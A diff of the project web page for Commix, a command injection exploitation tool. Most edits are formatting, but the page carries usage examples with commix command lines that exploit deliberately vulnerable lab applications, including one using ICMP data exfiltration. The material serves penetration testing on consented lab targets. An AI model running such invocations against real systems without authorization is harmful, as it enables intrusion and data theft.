@@ -5,9 +5,7 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="chrome=1">
     <meta name="description" content="Commix : Automated All-in-One OS Command Injection and Exploitation Tool">
-
-    <link rel="stylesheet" type="text/css" media="screen" href="stylesheets/stylesheet.css">
-
+    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css">
     <title>Commix</title>
   </head>
 
@@ -16,20 +14,20 @@
     <!-- HEADER -->
     <div id="header_wrap" class="outer">
         <header class="inner">
-          <a id="forkme_banner" href="https://github.com/stasinopoulos/commix">View on GitHub</a>
-
-          <h1 id="project_title">Commix</h1>
-          <h2 id="project_tagline">Automated All-in-One OS Command Injection and Exploitation Tool</h2>
-
+          <a id="logo" href="https://github.com/stasinopoulos/commix" target="_blank"> </a>
+          <a id="tweetme_banner" href="https://twitter.com/commixproject" target="_blank">Follow on Twitter</a>
+          <a id="forkme_banner" href="https://github.com/stasinopoulos/commix" target="_blank">View on GitHub</a>
+          <h1 id="project_title"><strong>Commix</strong></h1>
+          <h2 id="project_tagline">Automated All-in-One OS Command Injection and Exploitation Tool.</strong></h2>
             <section id="downloads">
-              <a class="zip_download_link" href="https://github.com/stasinopoulos/commix/zipball/master">Download this project as a .zip file</a>
+              <a class="zip_download_link" href="https://github.com/stasinopoulos/commix/zipball/master" >Download this project as a .zip file</a>
               <a class="tar_download_link" href="https://github.com/stasinopoulos/commix/tarball/master">Download this project as a tar.gz file</a>
             </section>
         </header>
     </div>
-
     <!-- MAIN CONTENT -->
     <div id="main_content_wrap" class="outer">
+      <hr>
       <section id="main_content" class="inner">
         <pre><code>                                       __
    ___    ___     ___ ___     ___ ___ /\_\   __  _ 
@@ -47,17 +45,17 @@ Copyright (c) 2015 Anastasios Stasinopoulos (@ancst)
 <h1>
 <a id="general-information" class="anchor" href="#general-information" aria-hidden="true"><span class="octicon octicon-link"></span></a>General Information</h1>
 
-<p>Commix (short for [comm]and [i]njection e[x]ploiter) has a simple environment and it can be used, from web developers, penetration testers or even security researchers to test web applications with the view to find bugs, errors or vulnerabilities related to command injection attacks. By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or string. Commix is written in Python programming language.</p>
+<p>Commix <em>(short for <strong>comm</strong>and <strong>i</strong>njection e<strong>x</strong>ploiter)</em> has a simple environment and it can be used, from web developers, penetration testers or even security researchers to test web applications with the view to find bugs, errors or vulnerabilities related to command injection attacks. By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or string. Commix is written in Python programming language.</p>
 
 <h1>
 <a id="disclaimer" class="anchor" href="#disclaimer" aria-hidden="true"><span class="octicon octicon-link"></span></a>Disclaimer</h1>
 
-<p>The tool is only for testing and academic purposes and can only be used where strict consent has been given. Do not use it for illegal purposes!!</p>
+<p>The tool is only for testing and academic purposes and can only be used where strict consent has been given. <strong>Do not use it for illegal purposes!!</strong></p>
 
 <h1>
 <a id="requirements" class="anchor" href="#requirements" aria-hidden="true"><span class="octicon octicon-link"></span></a>Requirements</h1>
 
-<p><a href="http://www.python.org/download/">Python</a> version <strong>2.6.x</strong> or <strong>2.7.x</strong> is required for running this program.</p>
+<p><a href="http://www.python.org/download/" target="_blank">Python</a> version <strong>2.6.x</strong> or <strong>2.7.x</strong> is required for running this program.</p>
 
 <h1>
 <a id="installation" class="anchor" href="#installation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Installation</h1>
@@ -65,7 +63,7 @@ Copyright (c) 2015 Anastasios Stasinopoulos (@ancst)
 <p>Commix comes pre-installed on the following Linux distributions:</p>
 
 <ul>
-<li><a href="http://blackarch.org/">BlackArch</a></li>
+<li><a href="http://blackarch.org/" target="_blank">BlackArch</a></li>
 </ul>
 
 <p>Download commix by cloning the Git repository:</p>
@@ -155,22 +153,22 @@ to provide custom injection payloads.
 <h4>
 <a id="usage-examples" class="anchor" href="#usage-examples" aria-hidden="true"><span class="octicon octicon-link"></span></a>Usage Examples</h4>
 
-<p><strong>Exploiting <a href="http://www.dvwa.co.uk/">Damn Vulnerable Web App</a></strong></p>
+<p><strong>Exploiting <a href="http://www.dvwa.co.uk/" target="_blank">Damn Vulnerable Web App</a></strong></p>
 
 <pre><code>python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&amp;submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
 </code></pre>
 
-<p><strong>Exploiting <a href="http://www.exploit-db.com/exploits/25496/">php-Charts 1.0</a> using injection payload suffix &amp; prefix string:</strong></p>
+<p><strong>Exploiting <a href="http://www.exploit-db.com/exploits/25496/" target="_blank">php-Charts 1.0</a> using injection payload suffix &amp; prefix string:</strong></p>
 
 <pre><code>python commix.py --url="http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE" --prefix="'" --suffix="//"
 </code></pre>
 
-<p><strong>Exploiting <a href="https://www.owasp.org/index.php/Category:OWASP_Mutillidae">OWASP Mutillidae</a> using Extra headers and HTTP proxy:</strong></p>
+<p><strong>Exploiting <a href="https://www.owasp.org/index.php/Category:OWASP_Mutillidae" target="_blank">OWASP Mutillidae</a> using Extra headers and HTTP proxy:</strong></p>
 
 <pre><code>python commix.py --url="http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php" --data="target_host=INJECT_HERE" --headers="Accept-Language:fr\nETag:123\n" --proxy="127.0.0.1:8081"
 </code></pre>
 
-<p><strong>Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/">Persistence</a> using ICMP exfiltration technique :</strong></p>
+<p><strong>Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/" target="_blank">Persistence</a> using ICMP exfiltration technique :</strong></p>
 
 <pre><code>su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
 </code></pre>
@@ -181,23 +179,23 @@ to provide custom injection payloads.
 <p>A collection of pwnable VMs, that includes web apps vulnerable to command injections.</p>
 
 <ul>
-<li><a href="http://www.dvwa.co.uk/">Damn Vulnerable Web App</a></li>
-<li><a href="https://www.owasp.org/index.php/Category:OWASP_Mutillidae">OWASP: Mutillidae</a></li>
-<li><a href="http://www.itsecgames.com/">bWAPP: bee-box (v1.6)</a></li>
-<li><a href="https://www.vulnhub.com/entry/persistence-1,103/">Persistence</a></li>
-<li><a href="https://www.vulnhub.com/entry/pentester-lab-web-for-pentester,71/">Pentester Lab: Web For Pentester</a></li>
-<li><a href="https://www.vulnhub.com/entry/command-injection-iso-1,81/">Pentester Academy: Command Injection ISO: 1</a></li>
-<li><a href="https://github.com/SpiderLabs/MCIR/tree/master/shellol">SpiderLabs: MCIR (ShelLOL)</a></li>
+<li><a href="http://www.dvwa.co.uk/" target="_blank">Damn Vulnerable Web App</a></li>
+<li><a href="https://www.owasp.org/index.php/Category:OWASP_Mutillidae" target="_blank">OWASP: Mutillidae</a></li>
+<li><a href="http://www.itsecgames.com/" target="_blank">bWAPP: bee-box (v1.6)</a></li>
+<li><a href="https://www.vulnhub.com/entry/persistence-1,103/" target="_blank">Persistence</a></li>
+<li><a href="https://www.vulnhub.com/entry/pentester-lab-web-for-pentester,71/" target="_blank">Pentester Lab: Web For Pentester</a></li>
+<li><a href="https://www.vulnhub.com/entry/command-injection-iso-1,81/" target="_blank">Pentester Academy: Command Injection ISO: 1</a></li>
+<li><a href="https://github.com/SpiderLabs/MCIR/tree/master/shellol" target="_blank">SpiderLabs: MCIR (ShelLOL)</a></li>
 <li>[...]</li>
 </ul>
       </section>
+      <hr>
     </div>
 
     <!-- FOOTER  -->
     <div id="footer_wrap" class="outer">
       <footer class="inner">
-        <p class="copyright">Commix maintained by <a href="https://github.com/stasinopoulos">stasinopoulos</a></p>
-        <p>Published with <a href="https://pages.github.com">GitHub Pages</a></p>
+        <p class="copyright"><strong>Commix </strong> maintained by <strong><a href="https://github.com/stasinopoulos">Anastasios Stasinopoulos</a> <em>(<a href="https://twitter.com/ancst">@ancst</a></em></strong>)</a> </p>
       </footer>
     </div>
 
